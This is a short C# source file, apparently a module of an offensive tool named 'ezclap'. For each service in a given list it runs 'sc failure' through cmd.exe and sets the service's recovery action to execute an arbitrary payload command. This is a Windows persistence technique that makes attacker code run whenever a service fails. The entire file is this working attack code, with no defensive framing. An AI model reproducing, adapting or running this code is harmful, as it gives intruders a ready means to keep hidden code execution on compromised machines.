using System;
using System.Collections.Generic;
namespace ezclap
{
	public class AddFailureCommand
    {
		public AddFailureCommand(List<string> services, string payload)
        {
            Initialize(services, payload);
        }
		private static void Initialize(List<string> services, string payload)
        {
            foreach (string service in services)
            {
                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000//// command= \"" + payload + "\" ";
                System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
            }

        }
    }
}
